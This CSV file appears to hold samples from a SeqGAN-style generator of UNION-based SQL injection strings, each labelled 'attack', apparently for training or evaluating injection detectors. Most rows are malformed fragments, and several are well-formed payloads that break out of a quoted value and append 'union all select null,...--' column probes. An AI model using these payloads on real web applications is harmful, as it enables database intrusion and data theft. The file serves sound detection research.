label,payload,family,payload_type,method,run_id,sample_index
attack,-3059   )    )    )   unionn  )   )    )    where  )    )    union select @7497)   -- u @)    )    )     )    )   )    )  '  =  select 1980@ i1  =  =  =  =  =  select * usersers --,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,21
attack,"-'  -- all select 5349,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,22
attack,"-)   -- all * users  (    )  es$""   )  (    )   where i union union nullnull,null,null,null,null,null,null,null,null,null----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,23
attack,"""  =u  (   union, e)    )    )    )   union select 8890--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,24
attack,"-""  )     )9860N all all usion  )    )    )    )     )   )    )   union all 1,1249",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,25
attack,"-1134' union all all * select @iod13084 nullrs us in  (    )    )    u  )    )   2088  1 1 where  )    )    )    as where select 1917@users --  -- from,ers",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,26
attack,-)' union  select null--#,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,27
attack,"-43738521 union select 7845,3990,3990,9814,7845,7845--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,28
attack,"-5131'  )    )    )     )   union 1980,1249",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,29
attack,"  1  )   )3997union all select null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,30
attack,"-   )    )    unione -- all all select null,null,null,8123,4300,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,31
attack,"-s'  )     )    )     )     -- 1494,io1 u  (   )    )    )    )   as where union 1 =  1    )    )    )   union null,null,1917,null,null,null,9110,null,null,null,null,@fromnull,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,32
attack,"-""'   )   union all null,7497,null,nullnull,null,null,null,null,null,null,4600,null,null,8123,@,null,null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,33
attack,"-,6996,4600'   (   union all union% i,null,nullnull--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,34
attack,"-6996%""    )   union all all all 1,3480,null,',null,null,null,9814#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,35
attack,"-  4589ts)   )    )    union all 1--,9988,3084",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,36
attack,-4542' . i  d . or g@$   =  2774       all id  =  1 or * uod  1 union select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,37
attack,"-4205""   )    union all  all all select --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,38
attack,"-6097%""   )    )    )S'  )   union 1,v--,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,39
attack,"-3997   )  7531 union select *, --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,40
attack,"-%""  where)  =  =  =  )     )   union select 9322,7497,,7497--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,41
attack,1'-- -- $ where   1  users,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,42
attack,"-31161401)   )     )     )    )     )    )    )    )    union all all null,--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,43
attack,"-c'v)    )    )    e""    )\union all all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,44
attack,"-'  )     union 2285,null,74977497,null,4600null,null,4600,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,45
attack,"1'  )    )    )    )    )    )    union all select null,3339,null,null,null,4481,3072,7497--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,46
attack,"11'  )    )   )    )     )    \  =  )   union all all select g,7845,5349,2446,30592263,9921,4481,2446,5349,,7497,null----3084,7348,null,9357,null,3072#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,47
attack,"-3084%'    )    )    )      u  )    union select  ,null,null,3339,null,null,3084,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,48
attack,"-8772%'  )  )     )     )   union all all null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,49
attack,"-6075'  )   )    )     )    union select null----5756,null,,null,null,null,null,null----3339----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,50
attack,"-6996%""    )    where where union select 3059--,null,1224,8665,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,51
attack,-n' i(t  )1494   where  1  )  =  all select null9110--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,52
attack,-'  )    )    )   =  ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,53
attack,1',union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,54
attack,"-3997qw""1980S'    )     )     )     )    N   ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,55
attack,"-4373.'  $-- union all 1 usrs where id,null --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,56
attack,"1'e%""   union select null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,57
attack,"-""   ,'   -- from ,8665null,8890,3339#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,58
attack,"-4966')    )    )    union all null,1297,null,null,null,null,4481,null,null,null,null, --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,59
attack," select *$,3990,6294,9814,9357--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,60
attack,"-5575)    )    )    )    asnull  )    )    union all all all nullnull,null,3084,null,3084#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,61
attack,"-%""'  )    union select null,8986,3084#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,62
attack,-7497)    )    )  )    union'  =  =  =  #select i9517#(   union,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,63
attack,"93223990,4909",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,64
attack,-4330'   )    8308)    union all all null',union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,65
attack,"-49661249' union null,7497--,3084,1224,null,3084,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,66
attack,"-5945'   )   )   )    union select null,null----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,67
attack,"-3059"")    )  )    )     )    union all 1 --$r    )   union all all 1,2446,8123,3072,3084,8123,null,null,3072--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,68
attack,"-%''  )    union all all all all1 select @)    s@usV)t)   as ususers -- -- uessers id  n1  (.    union1'  )    )    )    )    )    ) 1917  )    )    )    union 1224,2446,2446,1297,3072,9814",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,69
attack,-6253 3072s)    )    )    union 8890   select vrU)    )     )I--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,70
attack,"1's us all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,71
attack,"'    )    union select from,4481--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,72
attack,"-3084'  )   )    )    )    )   union all all h,null,7497,vr,null,null,9814 --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,73
attack,"-6097''   )    )  sunion all * all all select null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,74
attack,"-  )    union select 4600,null,null,1441,7845,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,75
attack,"o-4373s null,null,3084,91101646",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,76
attack,"-'  )    )    )    )hunion  7815 union select u,null#,4300--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,77
attack,"all all 1494 i-- ,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,78
attack,"% where oselect null,1441,4266,null,null,null,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,79
attack," select 9357,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,80
attack,"-   )   )    )    ) union all all select null,null,null,null,null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,81
attack,"-80736075 all select 4300,null,null,null,null--,null,9814,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,82
attack,-'  )    )    union all all 1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,83
attack,"-'   )    union' i=  =    where id  2088    )    )   where   )    )    )    )   )    )  )   union all select null,null--i,1224#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,84
attack,"1'   )    )    )     )    where a  )    )  )   union all select ,7845,2446--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,85
attack,"-""s union all all select null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,86
attack,-9110-- 1646,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,87
attack,"-J5575""   )    )    )   )  (     )   )   union all all select null,null,null,7497#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,88
attack,"-9156'  )    )   )hi6075  )     a$    )    )   union all from all ,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,89
attack,"3596-1401union 1)   )   )    )    )   )    )    )    )    )    where union d  =  =  =  '1'  =t  =  =  1 union all all  select 3990,3084,null,null,3072,null,null,null,9357,null,null,4854,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,90
attack,"-'2625)     )    )  )  )    union select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,91
attack,"-3370"" where  )    union 1494  1) union null,null,null,3084,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,92
attack,"-4542 where union all select 9110,@,v,3990,1297,9357,9988,1297#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,93
attack,"-  (    )    )'all where   1  ==  union all select 9357,null,,4600,7497,2446,7497--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,94
attack,"-5131""62947815s union 1"")    )   )   where id  =s id  =  (   )    )    union all .')    )    )    )     )    union   ---- all all O 1,6996,5756,ersers,null)     %,4909,6996,3084,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,95
attack,-4966',union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,96
attack,"-m2207   t'  )   )    union all null,null,8665----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,97
attack,"-2207  )    )   )    union select nullnull,null,null,null,9814#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,98
attack,-)       )    a  +     union null,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,99
attack,"-2011  (    union all 9517,null,2446,,null,1441,null,5756,1441,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,100
attack,-!3990,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,101
attack,"1'  )    union all all all select 5349,null,null,null,null,null,null,v#,3072--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,102
attack,"-""''  )     a   )    )   )    where  ( union all select all ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,103
attack,-6097%'  )   )    )  )  =  = 2774  =  =1   =h . $where union 9517select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,104
attack,-3997^4481''  )   union all 4854,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,105
attack,"-""   union all + all all select null,nullnull,null#--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,106
attack," select 9322,null,9814,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,107
attack,"-'  )   where select * from us,null,null,v,null,null,null,null,null,null,9814,null,1917,null,9322null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,108
attack,-7531,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,109
attack,"-3596h    )    )     )    union null,3339,null,null,null,null,null,null,null,9814,1224,null,4481,null,3084,null,null,null,null,null,1249,null,null,null,null,null,null,null,null,null,null,3084,null,null,null,null,null,null,1441,null,null,null------",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,110
attack,"-60973370'  )  )   )    where union all . 9110  (   )   union all select null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,111
attack,-51312774')    )    )     )   a  )   union allselect null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,112
attack,"-+e)    )   )     a5748 all all select u,7497,7497,7497,7497,74974481--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,113
attack,"-%""  )    where select -- null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,114
attack,"' union all select null,null,  ,3480,30721441,2446#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,115
attack,"-4966""    )    )   )    )   union 1 u  (    )    N where -- u where iunion select null,null,null,null,null,null,3072,null,null,null,null,9357,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,116
attack,"-4205' where all select 1,N--,v--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,117
attack,--%',union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,118
attack,"-  1 )s union 20881  1 union select 4854,3072,9357,3084--,8123,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,119
attack,"-3116""%'  )    )    )    union select ,,6996,2446,null--4854,5756,81234854,null,3084,null,3084--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,120
attack,"-1249'' union null,null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,121
attack,"-3370'   )   )    )    union select ---- 1646,9110,5349,,2263r,4600,3084,2446,1646----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,122
attack,1  )    )    union all (   o ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,123
attack,"-6253' where union select null, ,7497,7497,4600,7497,4600,1917#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,124
attack,-8073ao)ON null id  =t $  =  =1 ui  7815     )    )    union all * users$s--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,125
attack,"-2446""  )    )    )   union  all null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,126
attack," select ,1646,2446,,1249,9357,4481",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,127
attack,"-5131'  )    union * all all null,null,null,e,null,2446",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,128
attack,"-4542 where union  all union #,3990,null,null,null,null,null,3084,null,null,null,null,null,3339--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,129
attack,"s 1,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,130
attack,"-4330""   )   )    as \odwhere all select *,null,null,null,null,null,null,null,null,null,nullnull,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,131
attack,"-8521' union all all select null,null,null,#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,132
attack,1'   )   unionnr  )   )   )    )    union 91101 )  )    )    )    )   union 1980all all ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,133
attack,"1'    )    )    union all all -- all 3084,5349,3480,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,134
attack," . union all all select 9814e,null,8986,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,135
attack,---4205,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,136
attack,"-,3370--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,137
attack,"1' union all null,null,null,null,null--#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,138
attack,-& where union all 1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,139
attack,"-1249' union i1  )   union' where  )N where in  )    )    )    union all -- null,null,1441,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,140
attack,"-%'    )    )   as i  1  )    )    union all all all,'@Vs@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,141
attack,-6667'% union 1917o  -- * usnull --,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,142
attack," select nullr,4600,1646,null,49097845,3059,null,1917",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,143
attack,"-98608521""  )    )    all all 39908890,6996#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,144
attack,"-4542%'  )   union all e  nwhere union -,3990--,4854,4300R9322,null,null,null8665,null,null,9814,null,5756--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,145
attack,"-""""   )  )    )    union all select null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,146
attack,-3781e,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,147
attack,-5575',union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,148
attack,"1'' union select null,3084,null,null,null,3072--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,149
attack,"-6075'  )     )    )'  )    )     )    where union all all all select 9322,74977497,1441,4600,2446,4600,3072,1297,5756#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,150
attack,"1'   )   )    )    )    )    )    union select  1,9921,3480,1249,4600,4909,6996#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,151
